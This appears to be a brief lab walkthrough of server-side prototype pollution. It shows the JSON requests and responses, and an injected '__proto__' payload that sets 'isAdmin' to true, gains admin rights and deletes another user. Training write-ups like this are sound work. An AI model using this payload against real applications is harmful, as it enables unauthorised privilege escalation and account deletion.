# Privilege escalation via server-side prototype pollution
First, login to account. From here, update user options to see a full JSON object be sent, and updated JSON object be sent back.
```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "NfCNYaOHtXqjphXqDgiibV6vjiLJ4ogo",
}
```
To this, server responds with 
```json
{
    "username": "wiener",
    "firstname": "Peter",
    "lastname": "Wiener",
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "isAdmin": false,
}
```
We can then try to inject
```json
{
    [...]
    "__proto__" : {
        "isAdmin" : true
    }
}
```
And we get admin. Now we delete user Carlos and win. 